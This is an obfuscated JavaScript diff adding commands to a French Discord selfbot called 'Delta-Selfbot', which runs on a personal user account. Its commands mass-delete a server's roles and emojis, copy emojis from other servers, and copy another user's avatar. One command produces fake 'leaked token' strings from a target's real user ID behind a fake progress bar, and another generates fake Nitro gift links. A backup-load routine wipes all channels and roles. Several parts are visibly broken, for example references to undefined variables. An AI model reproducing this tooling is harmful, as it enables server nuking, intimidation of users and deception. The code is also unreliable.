+        if (_0x18f2x3b.content === prefix + 'delete all role') {
+            let _0x18f2x78 = _0x18f2x3c.guild;
+            if (!_0x18f2x3c.guild) {
+                _0x18f2x3b.edit(':x: **Veuillez executer cette commande sur un serveur!**');
+                return;
+            }
+            _0x18f2x3b.guild.roles.forEach(_0x18f2x47 =>
+
+                {
+                    _0x18f2x47.delete()
+                        .catch(_0x18f2x44 =>
+
+                            {
+                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                            });
+                });
+            console.log('Commande delete all role effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'punch')) {
+            if (!_0x18f2x3b.author) {
+                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
+                return;
+            }
+            let _0x18f2x84 = new Discord.RichEmbed();
+            _0x18f2x84.setColor(color)
+                .setTitle('**' + client.user.username + ' punch ' + _0x18f2x3e.username + '**')
+                .setTimestamp()
+                .setFooter('Delta-Selfbot')
+                .setImage(punch[Math.floor(Math.random() * punch.length)]);
+            _0x18f2x3b.edit(_0x18f2x84)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande punch effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'calin')) {
+            if (!_0x18f2x3b.author) {
+                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
+                return;
+            }
+            let _0x18f2x85 = new Discord.RichEmbed();
+            _0x18f2x85.setColor(color)
+                .setTitle('**' + client.user.username + ' fait un calin a ' + _0x18f2x3e.username + '**')
+                .setTimestamp()
+                .setFooter('Delta-Selfbot')
+                .setImage(hugh[Math.floor(Math.random() * hugh.length)]);
+            _0x18f2x3b.edit(_0x18f2x85)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande calin effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'set serveur name')) {
+            let _0x18f2x86 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta selfbot';
+            _0x18f2x3b.edit('Changement du nom du serveur pour: ' + (_0x18f2x3d.splice(1)
+                .join(' ') || 'Delta selfbot'));
+            _0x18f2x3b.guild.setName(_0x18f2x86);
+            console.log('Commande set serveur name effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith('' + prefix + 'token')) {
+            if (!_0x18f2x3b.author) {
+                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
+                return;
+            }
+            let token = [
+                'HircHg', 'XnyXiA', 'XluxwQ', 'XXn_KA', 'Xiq-WQ'
+            ];
+            let _0x18f2x87 = [
+                'a6uny9jcMjet2W2LASruribq6VI', 'oZyGJDamSJ4hmJaaLvzdNo1bLqk', '3_6Xt2k4OieDKimnNYGWUq9vJRo', 'xllelHltGdY7DP_0s1XST4cgzTs'
+            ];
+            var _0x18f2x53 = _0x18f2x3e.id;
+            var _0x18f2x88 = utf8.encode(_0x18f2x53);
+            var _0x18f2x89 = base64.encode(_0x18f2x88);
+            let _0x18f2x8a = new Discord.RichEmbed()
+                .setColor('' + color + '')
+                .setFooter('Delta-Selfbot')
+                .setTitle('Token match ' + _0x18f2x3e.username + '')
+                .setDescription('' + base64.encode(_0x18f2x88) + '.' + token[Math.floor(Math.random() * [
+                    'HircHg', 'XnyXiA', 'XluxwQ', 'XXn_KA', 'Xiq-WQ'
+                ].length)] + '.' + _0x18f2x87[Math.floor(Math.random() * [
+                    'a6uny9jcMjet2W2LASruribq6VI', 'oZyGJDamSJ4hmJaaLvzdNo1bLqk', '3_6Xt2k4OieDKimnNYGWUq9vJRo', 'xllelHltGdY7DP_0s1XST4cgzTs'
+                ].length)] + '');
+            setTimeout(() =>
+
+                {
+                    _0x18f2x3b.edit('░░░░░░░░░░ 0%');
+                }, 1000);
+            setTimeout(() =>
+
+                {
+                    _0x18f2x3b.edit('▓▓░░░░░░░░ 20%');
+                }, 1500);
+            setTimeout(() =>
+
+                {
+                    _0x18f2x3b.edit('▓▓▓▓░░░░░░ 40%');
+                }, 2000);
+            setTimeout(() =>
+
+                {
+                    _0x18f2x3b.edit('▓▓▓▓▓▓░░░░ 60%');
+                }, 2500);
+            setTimeout(() =>
+
+                {
+                    _0x18f2x3b.edit('▓▓▓▓▓▓▓▓░░ 80%');
+                }, 3000);
+            setTimeout(() =>
+
+                {
+                    _0x18f2x3b.edit('▓▓▓▓▓▓▓▓▓▓ 100%');
+                }, 3500);
+            setTimeout(() =>
+
+                {
+                    _0x18f2x3b.edit(_0x18f2x8a)
+                        .catch(_0x18f2x44 =>
+
+                            {
+                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                            });
+                }, 4000);
+            console.log('Commande token effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith('' + prefix + 'encode')) {
+            var _0x18f2x8b = _0x18f2x3d.join(' ') || 'Delta selfbot';;
+            var _0x18f2x88 = utf8.encode(_0x18f2x8b);
+            var _0x18f2x89 = base64.encode(_0x18f2x88);
+            let _0x18f2x8a = new Discord.RichEmbed()
+                .setColor('' + color + '')
+                .setTitle('Texte -> Base64 :')
+                .setDescription(_0x18f2x89);
+            _0x18f2x3b.edit(_0x18f2x8a)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande encode effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith('' + prefix + 'lovecalc')) {
+            let _0x18f2x8c = [
+                '5%', '10%', '15%', '20%', '25%', '30%', '35%', '40%', '45%', '50%', '55', '60%', '65%', '70%', '75%', '80%', '85%', '90%', '95%', '100%'
+            ];
+            let _0x18f2x8d = Math.floor(Math.random() * _0x18f2x8c.length);
+            let _0x18f2x8e = _0x18f2x3d.slice(0)
+                .join(' ') || 'Delta selfbot';;
+            let _0x18f2x12 = new Discord.RichEmbed()
+                .setAuthor(_0x18f2x3b.author.tag)
+                .setColor('ORANGE')
+                .setFooter('Delta-Selfbot')
+                .setThumbnail('' + _0x18f2x3b.author.avatarURL + '')
+                .addField('calcul de relation plausible ❤', _0x18f2x8e)
+                .addField('relation estimée à ❤', _0x18f2x8c[_0x18f2x8d]);
+            _0x18f2x3b.edit(_0x18f2x12)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande lovecalc effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'spotify')) {
+            const _0x18f2x7a = _0x18f2x3b.content.split(' ')
+                .slice(1)
+                .join(' ') || 'Delta Selfbot';
+            let _0x18f2x30 = rpcGenerator.createSpotifyRpc(client)
+                .setAssetsLargeImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e')
+                .setAssetsSmallImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e')
+                .setDetails(_0x18f2x7a)
+                .setState('Delta-Selfbot')
+                .setStartTimestamp(Date.now())
+                .setEndTimestamp(Date.now() + 86400000);
+            client.user.setPresence(_0x18f2x30.toDiscord())
+                .then(_0x18f2x3b.edit(':white_check_mark: **Tu écoutes ' + (_0x18f2x3b.content.split(' ')
+                    .slice(1)
+                    .join(' ') || 'Delta Selfbot') + ' sur spotify**'))
+                .catch(console.error);
+            console.log('Commande spotify effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith('' + prefix + 'reset')) {
+            clearInterval();
+            client.user.setActivity(null, {});
+            _0x18f2x3b.edit(':information_source:  Votre statut a été réinitialisé ! :information_source:')
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande reset effectué'.yellow);
+        }
+        if (_0x18f2x3b.content === '' + prefix + 'nitro') {
+            const _0x18f2x8f = new Discord.RichEmbed()
+                .setColor(color)
+                .setThumbnail('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
+                .addField('Gift :', '|| https://discord.gift/' + nitrocode(16, '0aA') + ' ||');
+            _0x18f2x3b.edit(_0x18f2x8f)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande nitro generator effectué'.yellow);
+        }
+        if (_0x18f2x3c.content.startsWith(prefix + 'gen token')) {
+            _0x18f2x3c.delete();
+            setTimeout(() =>
+
+                {
+                    client.destroy()
+                        .catch(_0x18f2x44 =>
+
+                            {
+                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                            });
+                }, 1500);
+            console.log('Nouveau token generé'.green);
+        }
+        if (_0x18f2x3c.content.startsWith(prefix + 'reverse')) {
+            let _0x18f2x90 = _0x18f2x3d.splice(1)
+                .join(' ');
+            if (!_0x18f2x3d.splice(1)
+                .join(' ')) {
+                _0x18f2x3b.edit(':x: **Pas de test definit**');
+            }
+
+            function _0x18f2x91(_0x18f2x92)
+
+            {
+                return _0x18f2x92['split']('')['reverse']()['join']('');
+            }
+            let _0x18f2x93 = _0x18f2x91(_0x18f2x90);
+            if (_0x18f2x3d[0] === _0x18f2x93) {
+                _0x18f2x93 = '' + _0x18f2x3d.splice(1)
+                    .join(' ') + '';
+            }
+            _0x18f2x3c.edit('' + ('' + _0x18f2x3d.splice(1)
+                    .join(' ') + '') + '')
+                .catch(console.error);
+            console.log('Commande reverse effectué'.yellow);
+        }
+        if (_0x18f2x3c.content.startsWith(prefix + 'discord')) {
+            let _0x18f2x94 = new Discord.RichEmbed()
+                .setColor(color)
+                .setDescription('Discord Version : **' + Discord.version + '**')
+                .setFooter('Delta-Selfbot');
+            _0x18f2x3c.edit(_0x18f2x94)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande discord effectué'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'restart') {
+            _0x18f2x3b.edit('**redémarrage** du self bot...')
+                .then(client.destroy())
+                .then(() =>
+
+                    {
+                        return client['login'](token);
+                    });
+            console.log('Commande restart effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'role info' || prefix + 'ri')) {
+            let _0x18f2x78 = _0x18f2x3b.guild;
+            let _0x18f2x95 = _0x18f2x3b.mentions.roles.first();
+            if (!_0x18f2x3b.guild) {
+                return _0x18f2x3c['edit'](':x: **Commande uniquement utilisable sur un serveur**');
+            }
+            if (!_0x18f2x3b.mentions.roles.first()) {
+                return _0x18f2x3b['delete']()['then'](console['log']('[', 'ERROR' ['red'], ']', 'un nom de rôle est nécessaire' ['green']));
+            }
+            const _0x18f2x6a = {
+                false: 'Non',
+                true: 'oui'
+            };
+            let _0x18f2x96 = new Discord.RichEmbed()
+                .setColor(color)
+                .setDescription('<@&' + _0x18f2x95.id + '>')
+                .addField('id du role:', _0x18f2x95.id)
+                .addField('couleur:', _0x18f2x95.hexColor)
+                .setFooter('Delta-Selfbot')
+                .addField('nombre de membres ayant ce role:', _0x18f2x95.members.size)
+                .addField('position:', _0x18f2x95.position)
+                .addField('mentionnable:', _0x18f2x6a[_0x18f2x95.mentionable]);
+            if (!_0x18f2x3b.member.hasPermission('EMBED_LINKS')) {
+                return _0x18f2x3b['edit'](`${ ':x: **permission insuffisante (embed_links)**\\n<@&' }${ _0x18f2x95['id'] }${ '>\\n\\nid du role: ' }${ _0x18f2x95['id'] }${ '\\ncouleur du role: ' }${ _0x18f2x95['hexColor'] }${ '\\nmembres ayant ce role: ' }${ _0x18f2x95['members']['size'] }${ '\\nposition: ' }${ _0x18f2x95['position'] }${ '\\nmentionnable: ' }${ _0x18f2x6a[_0x18f2x95['mentionable']] }${ '' }`);
+            }
+            console.log('Commande role info effectué'.yellow);
+            _0x18f2x3b.edit(_0x18f2x96)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'add emote')) {
+            if (_0x18f2x3b.channel.type === 'dm') {
+                _0x18f2x3b.edit(':x: **Commande pas executable en mp**');
+                return;
+            }
+            let _0x18f2x86 = _0x18f2x3d.splice(2)
+                .join(' ');
+            let _0x18f2x97 = Discord.Util.parseEmoji(_0x18f2x86);
+            if (!_0x18f2x3b.content.split(' ')
+                .splice(1)
+                .join(' ')) {
+                _0x18f2x3b.edit(':x: **Veuillez choisir une emote.**');
+                return;
+            }
+            if (!Discord.Util.parseEmoji(_0x18f2x86)) {
+                _0x18f2x3b.edit(':x: **Emote invalide essayez ceci** ' + prefix + 'add emote (emote) <name>');
+                return;
+            }
+            if (!_0x18f2x3b.member.hasPermission('MANAGE_EMOJIS')) {
+                _0x18f2x3b.edit(':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**');
+                return;
+            }
+            if (_0x18f2x97.id) {
+                const _0x18f2x98 = 'https://cdn.discordapp.com/emojis/' + _0x18f2x97.id + '.' + (_0x18f2x97.animated ? 'gif' : 'png') + '';
+                let _0x18f2x99 = _0x18f2x3b.content.split(' ')
+                    .splice(3) || _0x18f2x97.name;
+                _0x18f2x3b.guild.createEmoji('' + ('https://cdn.discordapp.com/emojis/' + _0x18f2x97.id + '.' + (_0x18f2x97.animated ? 'gif' : 'png') + '') + '', '' + (_0x18f2x3b.content.split(' ')
+                    .splice(3) || _0x18f2x97.name) + '');
+                _0x18f2x3b.edit(':white_check_mark: **Emote ajoutée au serveur.**');
+                console.log('Commande add emote executé.'.yellow);
+            } else {
+                _0x18f2x3b.edit(':x: **Veuillez choisir une emote valide!**');
+            }
+        }
+        if (_0x18f2x3b.content === prefix + 'emote') {
+            if (_0x18f2x3b.channel.type === 'dm') {
+                _0x18f2x3b.edit(':x: **Commande pas executable en mp**');
+                return;
+            }
+            let _0x18f2x9a = '';
+            let _0x18f2x9b = '';
+            let _0x18f2x9c = 0;
+            let _0x18f2x9d = 0;
+            let _0x18f2x9e = 0;
+
+            function _0x18f2x9f(_0x18f2x53)
+
+            {
+                return client['emojis']['get'](_0x18f2x53)
+                    .toString();
+            }
+            _0x18f2x3b.guild.emojis.forEach(_0x18f2xa0 =>
+
+                {
+                    0;
+                    if (_0x18f2xa0.animated) {
+                        0;
+                        _0x18f2x9b = '' + _0x18f2x9f(_0x18f2xa0.id);
+                    } else {
+                        0;
+                        _0x18f2x9a = '' + _0x18f2x9f(_0x18f2xa0.id);
+                    }
+                });
+            let _0x18f2x12 = new Discord.RichEmbed()
+                .setTitle('Emojis dans: **' + _0x18f2x3b.guild.name + '**')
+                .setFooter('Delta-Selfbot')
+                .setColor(color)
+                .addField('Emojis animés: [1]', '' || 'None')
+                .addField('Emojis [1]', '' || 'None')
+                .addField('Total d\'emojis', 1 || 'None');
+            _0x18f2x3b.edit(_0x18f2x12);
+            console.log('Commande emote executé.'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'remove emote')) {
+            if (_0x18f2x3b.channel.type === 'dm') {
+                _0x18f2x3b.edit(':x: **Commande pas executable en mp**');
+                return;
+            }
+            if (!_0x18f2x3b.member.hasPermission('MANAGE_EMOJIS')) {
+                return _0x18f2x3b['edit'](':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**');
+            }
+            const _0x18f2xa0 = _0x18f2x3d.splice(2)
+                .join(' ');
+            if (!_0x18f2x3d.splice(2)
+                .join(' ')) {
+                return _0x18f2x3b['edit'](`${ ':x: **Veuillez choisir une emote.**' }`);
+            }
+            let _0x18f2x97 = Discord.Util.parseEmoji(_0x18f2xa0);
+            if (!_0x18f2x3b.guild.emojis.forEach(_0x18f2xa1 =>
+
+                    {
+                        if (!_0x18f2xa1.id === _0x18f2x97.id) {
+                            return _0x18f2x3b['channel']['send'](`${ ':x: **Cette emote n\'est pas sur le serveur**.' }`);
+                        }
+                    })) {
+                return _0x18f2x3b['edit'](':white_check_mark: **Emote correctement supprimée du serveur.**');
+            }
+            if (_0x18f2x97.id) {
+                const _0x18f2x98 = 'https://cdn.discordapp.com/emojis/' + _0x18f2x97.id + '.' + (_0x18f2x97.animated ? 'gif' : 'png') + '';
+                _0x18f2x3b.guild.emojis.get(_0x18f2x97.id)
+                    .delete();
+            } else {
+                let _0x18f2xa2 = parse(_0x18f2xa0, {
+                    assetType: 'png'
+                });
+                if (!_0x18f2xa2[0]) {
+                    return _0x18f2x3b['edit'](`${ ':x: **Veuillez choisir une emote valide**!' }`);
+                }
+                _0x18f2x3b.edit(':x: **Vous ne pouvez pas supprimer les emotes par defaut**!');
+            };
+            console.log('Commande remove emote executé.'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'steal emote')) {
+            if (_0x18f2x3b.channel.type === 'dm') {
+                _0x18f2x3b.edit(':x: **Commande pas executable en mp**');
+                return;
+            }
+            let _0x18f2x86 = _0x18f2x3d.splice(2)
+                .join(' ');
+            let _0x18f2xa3 = client.guilds.get(_0x18f2x86);
+            if (!client.guilds.get(_0x18f2x86)) {
+                _0x18f2x3b.edit(':x: **Aucun serveur trouvable avec l\'id** "' + _0x18f2x3d.splice(2)
+                    .join(' ') + '"');
+                return;
+            }
+            if (!_0x18f2x3b.member.hasPermission('MANAGE_EMOJIS')) {
+                return _0x18f2x3b['edit'](':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**');
+            }
+            if (_0x18f2xa3.emojis.size < 1) {
+                _0x18f2x3b.edit(':x: **Le serveur ne contient aucun emote.**');
+            }
+            let i = '1';
+            _0x18f2xa3.emojis.forEach(_0x18f2xa1 =>
+
+                {
+                    setTimeout(() =>
+
+                        {
+                            let _0x18f2x99 = _0x18f2xa1.name;
+                            const _0x18f2x98 = 'https://cdn.discordapp.com/emojis/' + _0x18f2xa1.id + '.' + (_0x18f2xa1.animated ? 'gif' : 'png') + '';
+                            _0x18f2x3b.guild.createEmoji('' + ('https://cdn.discordapp.com/emojis/' + _0x18f2xa1.id + '.' + (_0x18f2xa1.animated ? 'gif' : 'png') + '') + '', '' + _0x18f2xa1.name + '')
+                                .catch(_0x18f2x44 =>
+
+                                    {
+                                        return '11';
+                                    });
+                        }, 1000);
+                });
+            console.log('Commande steal emote executé.'.yellow);
+            _0x18f2x3b.edit(':white_check_mark: **J\'ai volé les emotes du serveur** "' + _0x18f2xa3.name + '"');
+        }
+        if (_0x18f2x3b.content === prefix + 'delete all emote') {
+            if (_0x18f2x3b.channel.type === 'dm') {
+                _0x18f2x3b.edit(':x: **Commande pas executable en mp**');
+                return;
+            }
+            if (_0x18f2x3b.guild.emojis.size < 1) {
+                _0x18f2x3b.edit(':x: **Il n\' y a aucun emote a supprimer.**');
+                return;
+            }
+            _0x18f2x3b.guild.emojis.forEach(_0x18f2xa1 =>
+
+                {
+                    _0x18f2x3b.guild.emojis.get(_0x18f2xa1.id)
+                        .delete();
+                });
+        };
+        if (_0x18f2x3b.content.startsWith(prefix + 'grab pp')) {
+            let _0x18f2xa4 = _0x18f2x3b.mentions.users.first();
+            let _0x18f2xa5 = _0x18f2xa4.avatarURL;
+            if (!_0x18f2x3b.mentions.users.first()) {
+                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur valide!**');
+                return;
+            };
+            if (!_0x18f2xa4.avatarURL) {
+                _0x18f2x3b.edi(':x: **Cet utilisateur n\'a pas d\'avatar!**');
+                return;
+            };
+            client.user.setAvatar(_0x18f2xa5);
+            console.log('Commande grab pp executé.'.yellow);
+            _0x18f2x3b.edit(':white_check_mark: **J\'ai correctement volé la photo de profile de ** "' + _0x18f2xa4.username + '"');
+        };
+            let _0x18f2xa6 = client.emojis.get('655091815401127966') || 'ℹ️';
+            let _0x18f2xa7 = client.emojis.get('655695570769412096') || '⌛';
+            let _0x18f2xa8 = client.emojis.get('655696285286006784') || '✅';
+            let _0x18f2x44 = client.emojis.get('655704809483141141') || '❌';
+            let _0x18f2xa9 = client.emojis.get('656030540310380574') || '⚠️';
+            if (_0x18f2x3c.content === prefix + 'backup create' | _0x18f2x3c.content == prefix + 'backup c') {
+                let _0x18f2x78 = _0x18f2x3b.guild;
+                if (!_0x18f2x3b.guild) {
+                    _0x18f2x3b.edit(':x: **Veuillez executer cette commande dans un serveur!**');
+                _0x18f2x3b.guild.roles.filter(_0x18f2x45 =>
+
+                        {
+                            return _0x18f2x45['name'] !== _0x18f2x3b['guild']['member'](client['user']['id'])['highestRole']['name'];
+                        })
+                    .forEach(_0x18f2x45 =>
+
+                        {
+                            if (_0x18f2x45.comparePositionTo(_0x18f2x3b.guild.member(client.user.id)
+                                    .highestRole) > 0) {
+                                return _0x18f2x3b['edit'](`${ '' }${ _0x18f2xa9 }${ '  **Attention**\\n\\nMon role n\'est pas tout en haut dans la liste des roles du serveur, cela peut créer quelques ennuies lors de la création de la backup\\n\\nDelta-Selfbot' }`)['catch'](_0x18f2x44 => {
+                                    return console['log']('[', 'ERROR' ['red'], ']', 'une erreur est survenue que je ne peux régler' ['green']);
+                                });
+                            }
+                        });
+                _0x18f2x3b.edit('' + (client.emojis.get('655695570769412096') || '⌛') + '  **Please wait** ...\\n\\nCréation de la backup. Attendre la finalisation...\\n\\nDeltea-Selfbot')
+                    .catch(_0x18f2x44 =>
+
+                        {
+                            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                        })
+                    .then(_0x18f2x6d =>
+
+                        {
+                            let _0x18f2x53 = _0x18f2xba(16);
+                            const _0x18f2x82 = _0x18f2x3b.guild.channels.sort(function(_0x18f2x14, _0x18f2x15)
+
+                                    {
+                                        return _0x18f2x14.position - _0x18f2x15.position;
+                                    })
+                                .array()
+                                .map(_0x18f2x41 =>
+
+                                    {
+                                        const _0x18f2x43 = {
+                                            type: _0x18f2x41.type,
+                                            name: _0x18f2x41.name,
+                                            postion: _0x18f2x41.calculatedPosition
+                                        };
+                                        if (_0x18f2x41.parent) {
+                                            _0x18f2x43.parent = _0x18f2x41.parent.name;
+                                        }
+                                        return _0x18f2x43;
+                                    });
+                            const _0x18f2x47 = _0x18f2x3b.guild.roles.filter(_0x18f2x45 =>
+
+                                    {
+                                        return _0x18f2x45.name !== '@everyone';
+                                    })
+                                .sort(function(_0x18f2x14, _0x18f2x15)
+
+                                    {
+                                        return _0x18f2x14.position - _0x18f2x15.position;
+                                    })
+                                .array()
+                                .map(_0x18f2x45 =>
+
+                                    {
+                                        const _0x18f2x46 = {
+                                            name: _0x18f2x45.name,
+                                            color: _0x18f2x45.color,
+                                            hoist: _0x18f2x45.hoist,
+                                            permissions: _0x18f2x45.permissions,
+                                            mentionable: _0x18f2x45.mentionable,
+                                            position: _0x18f2x45.position
+                                        };
+                                        return _0x18f2x46;
+                                    });
+                            if (!backups[_0x18f2x3b.author.id]) {
+                                backups[_0x18f2x3b.author.id] = {};
+                            }
+                            backups[_0x18f2x3b.author.id][_0x18f2x53] = {
+                                icon: _0x18f2x3b.guild.iconURL,
+                                name: _0x18f2x3b.guild.name,
+                                owner: _0x18f2x3b.guild.ownerID,
+                                members: _0x18f2x3b.guild.memberCount,
+                                createdAt: _0x18f2x3b.guild.createdAt,
+                                roles: roles,
+                                channels: channels
+                            };
+                            _0x18f2xbe();
+                            console.log(('Nouvelle backup du serveur ' + _0x18f2x3b.guild.name + ' vien d\'être crée, voici son id : ' + _0x18f2xba(16) + '')
+                                .green);
+                            _0x18f2x3b.edit('' + (client.emojis.get('655091815401127966') || 'ℹ️') + '  **Info**\\n\\nNouvelle backup du serveur **' + _0x18f2x3b.guild.name + '** vien d\'être crée, voici son id : \\`' + _0x18f2xba(16) + '\\`\\n**' + prefix + 'backup load (id)** Pour load la backup\\n\\nDelta-Selfbot')
+                                .catch(_0x18f2x44 =>
+
+                                    {
+                                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                    });
+                        });
+                console.log('Commande create backup executé'.yellow);
+            }
+            if (_0x18f2x3c.content.startsWith(prefix + 'backup delete')) {
+                let _0x18f2x78 = _0x18f2x3b.guild;
+                if (!_0x18f2x3b.guild) {
+                    _0x18f2x3b.edit(':x: **Veuillez executer cette commande dans un serveur!**');
+                    return;
+                }
+                let _0x18f2xaa = _0x18f2x3d.splice(2)
+                    .join(' ');
+                let _0x18f2xab = new Discord.RichEmbed()
+                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + ' Erreur')
+                    .setFooter('Delta-Selfbot')
+                    .setDescription('Tu dois définir ton id de backup... Fais ' + prefix + 'help pour avoir plus d\'informations.')
+                    .setColor(color);
+                if (!_0x18f2x3d.splice(2)
+                    .join(' ')) {
+                    return _0x18f2x3b['edit'](_0x18f2xab)['catch'](_0x18f2x44 => {
+                        return console['log']('[', 'ERROR' ['red'], ']', 'une erreur est survenue que je ne peux régler' ['green']);
+                    });
+                }
+                let _0x18f2xac = new Discord.RichEmbed()
+                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + '  Error')
+                    .setFooter('Delta-Selfbot')
+                    .addField('**Tu n\'a pas de backup avec cette id : ' + _0x18f2x3d.splice(2)
+                        .join(' ') + '.**', prefix + 'help pour plus d\'informations')
+                    .setColor(color);
+                if (!backups[_0x18f2x3b.author.id][_0x18f2xaa]) {
+                    return _0x18f2x3b['edit'](_0x18f2xac)['catch'](_0x18f2x44 => {
+                        return console['log']('[', 'ERROR' ['red'], ']', 'une erreur est survenue que je ne peux régler' ['green']);
+                    });
+                };
+                delete backups[_0x18f2x3b.author.id][_0x18f2xaa];
+                _0x18f2xbe();
+                let _0x18f2xad = new Discord.RichEmbed()
+                    .setTitle('' + (client.emojis.get('655696285286006784') || '✅') + '  Succès !')
+                    .setFooter('Delta-Selfbot')
+                    .setDescription('La **backup** a bien été supprimée.')
+                    .setColor(color);
+                _0x18f2x3b.edit(_0x18f2xad)
+                    .catch(_0x18f2x44 =>
+
+                        {
+                            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                        });
+                console.log('Commande delete backup executé'.yellow);
+            }
+            if (_0x18f2x3c.content.startsWith(prefix + 'backup load') || _0x18f2x3c.content.startsWith(prefix + 'backup l')) {
+                let _0x18f2x78 = _0x18f2x3b.guild;
+                if (!_0x18f2x3b.guild) {
+                    _0x18f2x3b.edit(':x: **Veuillez executer cette commande dans un serveur!**');
+                    return;
+                }
+                let _0x18f2x44 = client.emojis.get('655704809483141141') || '❌';
+                let _0x18f2xaa = _0x18f2x3d.splice(2)
+                    .join(' ');
+                let _0x18f2xab = new Discord.RichEmbed()
+                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + '  Error')
+                    .setDescription('Tu as oublié de définir une **id de backup**. Utilise la commande \\`' + prefix + 'help\\` pour avoir plus d\'informations');
+                if (!_0x18f2x3d.splice(2)
+                    .join(' ')) {
+                    return _0x18f2x3b['channel']['send'](_0x18f2xab);
+                }
+                let _0x18f2xac = new Discord.RichEmbed()
+                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + '  Error')
+                    .addField('**Aucune backup avec l\'id ' + _0x18f2x3d.splice(2)
+                        .join(' ') + '.**', '/help pour plus d\'information')
+                    .setFooter('Delta-Selfbot')
+                    .setColor(color);
+                if (!backups[_0x18f2x3b.author.id][_0x18f2xaa]) {
+                    return _0x18f2x3b['channel']['send'](_0x18f2xac)['catch'](_0x18f2x44 => {
+                        return console['log']('[', 'ERROR' ['red'], ']', 'une erreur est survenue que je ne peux régler' ['green']);
+                    });
+                }
+                _0x18f2x3b.guild.channels.forEach(_0x18f2x43 =>
+
+                    {
+                        _0x18f2x43.delete('For Loading A Backup');
+                    });
+                _0x18f2x3b.guild.roles.filter(_0x18f2x46 =>
+
+                        {
+                            return _0x18f2x46.members.every(_0x18f2x79 =>
+
+                                {
+                                    return !_0x18f2x79.user.bot;
+                                });
+                        })
+                    .forEach(_0x18f2x46 =>
+
+                        {
+                            _0x18f2x46.delete('For Loading A Backup');
+                        });
+                backups[_0x18f2x3b.author.id][_0x18f2xaa].roles.forEach(function(_0x18f2x46)
+
+                    {
+                        _0x18f2x3b.guild.createRole({
+                                name: _0x18f2x46.name,
+                                color: _0x18f2x46.color,
+                                permissions: _0x18f2x46.permissions,
+                                hoist: _0x18f2x46.hoist,
+                                mentionable: _0x18f2x46.mentionable,
+                                position: _0x18f2x46.position
+                            })
+                            .then(_0x18f2x46 =>
+
+                                {
+                                    _0x18f2x46.setPosition(_0x18f2x46.position);
+                                });
+                    });
+                backups[_0x18f2x3b.author.id][_0x18f2xaa].channels.filter(_0x18f2x41 =>
+
+                        {
+                            return _0x18f2x41.type === 'category';
+                        })
+                    .forEach(function(_0x18f2xae)
+
+                        {
+                            _0x18f2x3b.guild.createChannel(_0x18f2xae.name, {
+                                type: _0x18f2xae.type,
+                                permissionOverwrites: _0x18f2xae.permissionOverwrites
+                            });
+                        });
+                backups[_0x18f2x3b.author.id][_0x18f2xaa].channels.filter(_0x18f2x41 =>
+
+                        {
+                            return _0x18f2x41.type !== 'category';
+                        })
+                    .forEach(function(_0x18f2xae)
+
+                        {
+                            _0x18f2x3b.guild.createChannel(_0x18f2xae.name, {
+                                    type: _0x18f2xae.type,
+                                    permissionOverwrites: _0x18f2xae.permissionOverwrites
+                                })
+                                .then(_0x18f2x41 =>
+
+                                    {
+                                        const _0x18f2xaf = _0x18f2x3b.guild.channels.filter(_0x18f2x41 =>
+
